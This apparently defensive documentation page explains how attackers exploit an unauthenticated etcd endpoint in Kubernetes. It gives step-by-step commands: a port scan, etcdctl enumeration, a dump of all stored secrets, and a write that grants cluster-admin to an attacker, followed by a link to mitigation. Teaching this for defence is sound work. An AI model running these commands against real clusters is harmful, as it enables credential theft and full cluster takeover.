---
sidebar_position: 7
title: "Unrestricted etcd Access"
description: "How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."
---

# Unrestricted etcd Access

**etcd** is the key-value store that holds all Kubernetes cluster data, including **secrets, configuration, and state**. If exposed or misconfigured, it becomes a high-value target for attackers who can **retrieve credentials, modify cluster settings, or delete critical resources**.

---

## Exploitation Steps

An attacker targets an unprotected `etcd` endpoint to access or manipulate cluster-wide data.

### 1. Scan for Open etcd Endpoints

The attacker scans the network to locate accessible etcd instances (port `2379`):

```bash
nmap -p 2379 --open <cluster-ip-range>
```

If port `2379` is exposed, the attacker targets it for further exploitation.

---

### 2. Enumerate etcd Keys

Without authentication or TLS, the attacker can query the keyspace:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get / --prefix --keys-only
```

This reveals the structure and contents of etcd, including keys under `/registry/` that store Kubernetes resources.

---

### 3. Extract Kubernetes Secrets

The attacker dumps secrets directly from etcd:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get /registry/secrets --prefix
```

This includes service account tokens, API keys, kubeconfig files, and other sensitive credentials.

---

### 4. Modify Cluster Configuration

With write access, the attacker injects new configuration or escalates privileges:

```bash
ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 put /registry/rbac/rolebindings/cluster-admin '{"user": "attacker", "role": "cluster-admin"}'
```

This effectively grants `cluster-admin` rights to any user they choose.

---

### Result

The attacker achieves full compromise of the Kubernetes cluster by:

- Extracting sensitive secrets
- Gaining persistent admin access
- Modifying or deleting critical cluster resources

If etcd is not protected, the **entire cluster is at risk**.

---

## Mitigation

➡ [Securing etcd in Kubernetes](/docs/best_practices/cluster_setup_and_hardening/control_plane_security/etcd_security_mitigation)
